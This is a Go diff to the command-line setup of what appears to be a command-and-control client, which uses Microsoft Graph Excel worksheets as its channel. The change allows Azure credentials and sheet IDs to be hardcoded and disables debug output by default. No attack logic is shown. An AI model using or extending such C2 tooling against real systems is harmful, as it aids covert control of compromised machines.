@@ -10,12 +10,14 @@ import (
 )
 
 var (
-	tenantId     string
-	clientId     string
-	clientSecret string
-	driveId      string
-	sheetId      string
-	debug        bool = true
+	// TO HARDCODE, set the values here, eg...
+	// tenantID string = "blahblahblah....I'm_a_tenant_id...."
+	tenantId      string
+	clientId      string
+	clientSecret  string
+	driveId       string
+	sheetId       string
+	debug_default bool = false
 )
 
 var rootCmd = &cobra.Command{
@@ -37,6 +39,7 @@ var rootCmd = &cobra.Command{
 		c2.UserAgent = "GoLang Client"
 		c2.HttpClient = new(http.Client)
 		c2.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + c2.DriveId + "/items/" + c2.SheetId + "/workbook/worksheets"
+		c2.Debug = debug_default
 
 		//Start
 		C2.Run(c2)
@@ -44,22 +47,33 @@ var rootCmd = &cobra.Command{
 }
 
 func init() {
-	rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
-	rootCmd.MarkFlagRequired("tenant") // Comment to hardcode
+	if tenantId == "" {
+		rootCmd.Flags().StringVarP(&tenantId, "tenant", "t", os.Getenv("TENANT_ID"), "Azure tenant ID")
+		rootCmd.MarkFlagRequired("tenant")
+	}
 
-	rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIET_ID"), "Azure client ID")
-	rootCmd.MarkFlagRequired("client") // Comment to hardcode
+	if clientId == "" {
+		rootCmd.Flags().StringVarP(&clientId, "client", "c", os.Getenv("CLIET_ID"), "Azure client ID")
+		rootCmd.MarkFlagRequired("client")
+	}
 
-	rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
-	rootCmd.MarkFlagRequired("secret") // Comment to hardcode
+	if clientSecret == "" {
+		rootCmd.Flags().StringVarP(&clientSecret, "secret", "s", os.Getenv("CLIENT_SECRET"), "Azure client secret")
+		rootCmd.MarkFlagRequired("secret")
 
-	rootCmd.Flags().StringVarP(&driveId, "drive", "d", os.Getenv("DRIVE_ID"), "Azure drive ID")
-	rootCmd.MarkFlagRequired("drive") // Comment to hardcode
+	}
 
-	rootCmd.Flags().StringVarP(&sheetId, "sheet", "e", os.Getenv("SHEET_ID"), "Azure sheet ID")
-	rootCmd.MarkFlagRequired("sheet") // Comment to hardcode
+	if driveId == "" {
+		rootCmd.Flags().StringVarP(&driveId, "drive", "d", os.Getenv("DRIVE_ID"), "Azure drive ID")
+		rootCmd.MarkFlagRequired("drive")
+	}
 
-	rootCmd.Flags().BoolVarP(&debug, "verbos", "v", false, "Enable verbos output")
+	if sheetId == "" {
+		rootCmd.Flags().StringVarP(&sheetId, "sheet", "e", os.Getenv("SHEET_ID"), "Azure sheet ID")
+		rootCmd.MarkFlagRequired("sheet")
+	}
+
+	rootCmd.Flags().BoolVarP(&debug_default, "verbos", "v", debug_default, "Enable verbos output")
 
 }
 
